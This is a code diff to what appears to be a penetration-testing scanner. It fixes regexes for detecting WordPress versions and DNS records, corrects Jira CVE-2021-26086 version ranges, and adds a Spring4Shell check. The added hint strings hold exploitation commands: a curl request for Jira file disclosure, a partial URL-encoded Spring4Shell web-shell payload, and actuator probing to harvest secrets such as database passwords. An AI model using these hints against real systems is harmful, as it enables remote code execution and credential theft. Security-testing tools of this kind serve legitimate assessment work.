@@ -1953,11 +1953,21 @@ _WORDPRESS_META = re.compile(
     r'[\'"]WordPress\s+(\d+\.\d+(?:\.\d+)?)'
 )
 _WORDPRESS_QUERY_VER = re.compile(
-    r'(?i)/wp-(?:includes|content|admin)/[^\s\'"?]*\?ver=(\d+\.\d+(?:\.\d+)?)'
+    # iter-237 audit fix: /wp-content/ theme/plugin resources have
+    # THEIR OWN ?ver= that reports the theme/plugin version, NOT
+    # WordPress core. Restricted to /wp-includes/ (core JS/CSS)
+    # + /wp-admin/ (also core) so ?ver= reliably reflects the core.
+    r'(?i)/wp-(?:includes|admin)/[^\s\'"?]*\?ver=(\d+\.\d+(?:\.\d+)?)'
 )
 _WORDPRESS_PATH = re.compile(
-    r'(?i)(?:https?://[^/\s]+)?/(?:wp-admin|wp-login\.php|'
-    r'wp-content/(?:plugins|themes|uploads))/'
+    # iter-237 audit fix: prior regex forced trailing `/` on ALL
+    # alternatives, so `GET /wp-login.php HTTP/1.1` (the canonical
+    # request line) never matched. Split per-alternative: wp-admin
+    # + wp-content need `/` after; wp-login.php just needs
+    # whitespace / query / end.
+    r'(?i)(?:https?://[^/\s]+)?/'
+    r'(?:wp-admin/|wp-content/(?:plugins|themes|uploads)/|'
+    r'wp-login\.php(?=[\s?&]|$|[A-Z]))'
 )
 
 # Joomla version signals:
@@ -2031,11 +2041,16 @@ _DIG_HEADER = re.compile(
 # Format: `<name>.\t<ttl>\tIN\tA\t<ip>` (bind style) OR from Windows
 # DNS: `<name>.<domain>\tA\t<ip>`.
 _DNS_A_RECORD_ROW = re.compile(
-    r'(?im)^([\w.\-]{2,80})\.\s+(?:\d+\s+)?IN\s+(A|AAAA|CNAME)\s+'
-    r'([\w.:\-]{3,80})'
+    # iter-237 audit fix: trailing `.` after name is BIND-style
+    # convention; Windows dnscmd AXFR captures don't include it.
+    # Made `.` optional so both `dc01.corp.local. IN A 10.0.0.1`
+    # (bind) and `dc01.corp.local A 10.0.0.1` (windows dnscmd)
+    # match. Also made `IN` optional for the same reason.
+    r'(?im)^([\w.\-]{2,80})\.?\s+(?:\d+\s+)?(?:IN\s+)?'
+    r'(A|AAAA|CNAME)\s+([\w.:\-]{3,80})'
 )
 _DNS_SRV_RECORD_ROW = re.compile(
-    r'(?im)^(_[\w.\-]{2,80})\.\s+(?:\d+\s+)?IN\s+SRV\s+'
+    r'(?im)^(_[\w.\-]{2,80})\.?\s+(?:\d+\s+)?(?:IN\s+)?SRV\s+'
     r'\d+\s+\d+\s+(\d+)\s+([\w.\-]{2,80})'
 )
 
@@ -3186,10 +3201,14 @@ def _multiline_passes(path, report, store):
             _jv = _jira_m.group(1)
             _jvt = _vtuple(_jv)
             _jira_cve = ""
-            # Vulnerable: 8.5.0 <= v < 8.5.14, 8.13.0 <= v < 8.13.6,
-            # 8.14.0 <= v < 8.16.1
+            # iter-237 audit fix: prior middle branch was `>= 8.13.0`
+            # which SKIPS the 8.6.0-8.12.x window per Atlassian
+            # advisory. Correct: 8.5.0-8.5.13, 8.6.0-8.13.5, 8.14.0-
+            # 8.16.0. This collapses to two contiguous windows:
+            # 8.5.0-8.13.5 (excluding 8.5.14 patch line) and
+            # 8.14.0-8.16.0.
             if ((_jvt >= (8, 5, 0) and _jvt < (8, 5, 14))
-                    or (_jvt >= (8, 13, 0) and _jvt < (8, 13, 6))
+                    or (_jvt >= (8, 6, 0) and _jvt < (8, 13, 6))
                     or (_jvt >= (8, 14, 0) and _jvt < (8, 16, 1))):
                 _jira_cve = ("  |  CVE-2021-26086 file disclosure: "
                              "curl -s 'http://<host>/s/thiswillnotwork/"
@@ -3203,6 +3222,43 @@ def _multiline_passes(path, report, store):
                              f"listing), /rest/api/2/user/picker?query="
                              f"' (user enum), /issues/?filter=-4 (open "
                              f"issues){_jira_cve}"))
+
+        # Spring version → CVE-2022-22965 Spring4Shell check.
+        # iter-237 audit fix: prior _SPRING_VERSION pattern was
+        # defined but never wired to any dispatcher (dead code).
+        # Spring4Shell affects Spring MVC/WebFlux < 5.3.18 and
+        # < 5.2.20 on Java 9+ with Tomcat servlet packaging.
+        _spr_m = _SPRING_VERSION.search(text[:16384])
+        if _spr_m:
+            _sv = _spr_m.group(1)
+            _svt = _vtuple(_sv)
+            _spr_cve = ""
+            if ((_svt >= (5, 3, 0) and _svt < (5, 3, 18))
+                    or (_svt >= (5, 2, 0) and _svt < (5, 2, 20))):
+                _spr_cve = (
+                    "  |  CVE-2022-22965 Spring4Shell RCE - "
+                    "class.module.classLoader.resources.context."
+                    "parent.pipeline.first.pattern injection: curl "
+                    "'http://<host>/?class.module.classLoader."
+                    "resources.context.parent.pipeline.first."
+                    "pattern=%25%7Bc2%7Di%20if(%22j%22.equals("
+                    "request.getParameter(%22pwd%22)))%7B%20java.io."
+                    "InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime"
+                    "().exec(request.getParameter(%22cmd%22))"
+                    ".getInputStream()...' - see original Praetorian "
+                    "PoC for full URL-encoded payload  |  requires "
+                    "Java 9+ AND Tomcat AND WAR packaging (NOT jar)")
+            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                       _ln(_spr_m),
+                       f"Spring {_sv} exposed - version banner "
+                       f"captured",
+                       hint=(f"actuator enum: curl -s http://<host>/"
+                             f"actuator (Spring Boot) or /manage - "
+                             f"reveals /env, /heapdump, /trace - "
+                             f"loot for secrets  |  /env sensitive "
+                             f"vars often expose SPRING_"
+                             f"DATASOURCE_PASSWORD, spring.data."
+                             f"redis.password{_spr_cve}"))
 
         # Log4j version → CVE-2021-44228 Log4Shell check.
         _l4j_m = _LOG4J_VERSION.search(text[:16384])
